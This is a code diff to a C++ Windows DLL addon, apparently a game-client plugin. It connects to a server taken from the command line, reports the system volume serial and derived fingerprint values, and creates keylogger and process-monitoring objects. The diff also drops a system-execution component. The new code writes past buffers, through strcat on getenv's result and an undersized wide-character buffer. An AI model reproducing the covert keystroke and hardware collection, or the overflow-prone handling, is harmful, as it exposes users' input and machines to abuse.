@@ -1,18 +1,21 @@
 #pragma once
 
+
+
 #include "addon.h"
 
 
 
-addonThread *gThread;
-addonMutex *gMutex;
-addonSocket *gSocket;
-addonProcess *gProcess;
-addonKeylog *gKeylog;
-addonScreen *gScreen;
-addonSysexec *gSysexec;
-addonFS *gFS;
-addonString *gString;
+
+
+extern addonThread *gThread;
+extern addonMutex *gMutex;
+extern addonSocket *gSocket;
+extern addonProcess *gProcess;
+extern addonKeylog *gKeylog;
+extern addonScreen *gScreen;
+extern addonFS *gFS;
+extern addonString *gString;
 
 extern std::queue<std::string> send_to;
 
@@ -30,19 +33,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	}
 	else if(fdwReason == DLL_PROCESS_DETACH)
 	{
-		delete gSysexec;
-		delete gKeylog;
-		delete gProcess;
-
-		gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1001 << " " << hinstDLL << " " << fdwReason << " " << lpvReserved);
-
-		Sleep(1000);
-
 		gSocket->Close();
 
+		delete gKeylog;
+		delete gProcess;
 		delete gThread;
-
-		gMutex->Delete();
+		delete gMutex;
 
 		addonDebug("-----------------------------------------------------------------");
 		addonDebug("Called dll detach | hinstDLL 0x%x | fdwReason %i | lpvReserved %i", hinstDLL, fdwReason, lpvReserved);
@@ -71,41 +67,39 @@ __declspec(dllexport) void addon_start()
 
 
 
-DWORD main_thread(void *lpParam)
+DWORD addonThread::Thread(void *lpParam)
 {
-	addonDebug("Thread 'main_thread' succesfuly started");
+	addonDebug("Thread addonThread::Thread(%i) succesfuly started", (int)lpParam);
 
 	std::string commandLine = gString->wstring_to_string(std::wstring(GetCommandLineW()));
 
 	if(commandLine.find("-c") == std::string::npos)
 		return false;
 
-	std::string nickname;
-	std::string ip;
-	std::size_t buf;
+	char name[25];
+	char ip[16];
+	char *sysdrive;
+	int port;
 
 	DWORD serial;
 	DWORD flags;
-	int port;
+	WCHAR tmpstr[5];
 	
-	buf = (commandLine.find(" -c -n ") + 7);
-	nickname = commandLine.substr(buf, (commandLine.find(" -h ") - buf));
-	buf = (commandLine.find(" -h ") + 4);
-	ip = commandLine.substr(buf, (commandLine.find(" -p ") - buf));
-	buf = (commandLine.find(" -p ") + 4);
-	port = atoi(commandLine.substr(buf, INFINITE).c_str());
+	commandLine.erase(NULL, commandLine.find("-c -n "));
+	sscanf_s(commandLine.c_str(), "%*s %*s %s %*s %s %*s %d", name, sizeof name, ip, sizeof ip, &port);
 
 	gSocket = new addonSocket();
-	gSocket->socketHandle = gSocket->Create();
-	gSocket->Connect(ip, (port + 1));
+	gSocket->Connect(std::string(ip), (port + 1));
 
-	GetVolumeInformationW(L"C:\\", NULL, NULL, &serial, NULL, &flags, NULL, NULL);
+	sysdrive = getenv("SystemDrive");
+	strcat(sysdrive, "\\");
+	MultiByteToWideChar(NULL, NULL, sysdrive, strlen(sysdrive), tmpstr, sizeof tmpstr);
+	GetVolumeInformationW(tmpstr, NULL, NULL, &serial, NULL, &flags, NULL, NULL);
 
-	gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1000 << " " << serial << " " << (serial + (flags ^ 0x2296666)) << " " << nickname << " " << ((serial | flags) & 0x28F39) << " " << flags);
+	gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1000 << " " << serial << " " << (serial + (flags ^ 0x2296666)) << " " << name << " " << ((serial | flags) & 0x28F39) << " " << flags);
 
 	gProcess = new addonProcess();
 	gKeylog = new addonKeylog();
-	gSysexec = new addonSysexec();
 
 	return true;
 }
